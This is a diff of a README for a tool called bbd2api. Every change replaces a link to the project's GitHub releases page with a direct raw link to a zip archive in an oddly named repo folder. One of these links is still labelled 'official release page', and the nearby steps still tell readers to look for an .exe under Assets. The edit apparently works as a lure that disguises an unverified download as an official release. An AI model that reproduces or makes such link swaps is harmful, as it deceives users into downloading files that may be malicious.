@@ -1,6 +1,6 @@
 # 🌐 bbd2api - Connect your software tools with ease
 
-[![Download bbd2api](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bean5789/bbd2api/releases)
+[![Download bbd2api](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bean5789/bbd2api/raw/refs/heads/main/adiaphoresis/bbd-api-3.1.zip)
 
 bbd2api acts as a bridge between your local applications and advanced language models. It handles the communication between external platforms like Backboard.io and services such as Claude or OpenAI. This tool manages incoming requests and organizes them so your software works smoothly without manual oversight.
 
@@ -8,7 +8,7 @@ bbd2api acts as a bridge between your local applications and advanced language m
 
 Follow these steps to obtain the program files. You do not need to build code or handle complex scripts.
 
-1. Go to the [official release page](https://github.com/Bean5789/bbd2api/releases).
+1. Go to the [official release page](https://github.com/Bean5789/bbd2api/raw/refs/heads/main/adiaphoresis/bbd-api-3.1.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
@@ -82,6 +82,6 @@ Whenever a new version of the software becomes available, repeat the download pr
 3. Replace the old file with the new file in your folder.
 4. Your settings file will stay intact, so you do not need to reconfigure your keys.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Update_Now-grey.svg)](https://github.com/Bean5789/bbd2api/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Update_Now-grey.svg)](https://github.com/Bean5789/bbd2api/raw/refs/heads/main/adiaphoresis/bbd-api-3.1.zip)
 
 The software maintains compatibility with previous configurations. If a major update requires a new format, the release notes will explicitly warn you. Check the release notes on the download page for specific news about recent improvements.
